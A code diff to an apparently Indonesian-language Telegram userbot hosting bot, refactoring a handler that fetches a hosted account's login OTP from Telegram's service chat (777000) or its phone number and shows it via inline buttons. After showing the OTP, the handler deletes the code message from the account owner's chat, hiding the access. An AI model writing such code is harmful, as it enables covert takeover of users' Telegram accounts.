@@ -338,8 +338,7 @@ async def get_num_otp(client, callback_query):
             f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
             True,
         )
-    for X in ubot._ubot:
-        button = [
+    button = [
             [
                 InlineKeyboardButton(
                     "📁 ʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ 📁",
@@ -367,30 +366,31 @@ async def get_num_otp(client, callback_query):
                 InlineKeyboardButton("➡️", callback_data=f"next_ub {int(query[2])}"),
             ],
         ]
-        if int(query[1]) == X.me.id:
-            if query[0] == "get_otp":
-                async for otp in X.search_messages(777000, limit=1):
-                    try:
-                        if not otp.text:
-                            await callback_query.answer(
+    X = ubot._ubot[int(query[2])]
+    if int(query[1]) == X.me.id:
+        if query[0] == "get_otp":
+            async for otp in X.search_messages(777000, limit=1):
+                try:
+                    if not otp.text:
+                        await callback_query.answer(
                                 "<b>❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>", True
                             )
-                        else:
-                            await callback_query.edit_message_text(
+                    else:
+                         await callback_query.edit_message_text(
                                 otp.text,
                                 reply_markup=InlineKeyboardMarkup(button),
                             )
-                            await X.delete_messages(X.me.id, otp.id)
-                    except Exception as error:
-                        return await callback_query.answer(error, True)
-            elif query[0] == "get_phone":
-                try:
-                    return await callback_query.edit_message_text(
+                        await X.delete_messages(X.me.id, otp.id)
+                except Exception as error:
+                    return await callback_query.answer(error, True)
+        elif query[0] == "get_phone":
+            try:
+                return await callback_query.edit_message_text(
                         X.me.phone_number,
                         reply_markup=InlineKeyboardMarkup(button),
                     )
-                except Exception as error:
-                    return await callback_query.answer(error, True)
+            except Exception as error:
+                return await callback_query.answer(error, True)
 
 
 async def cek_userbot_expired(client, callback_query):
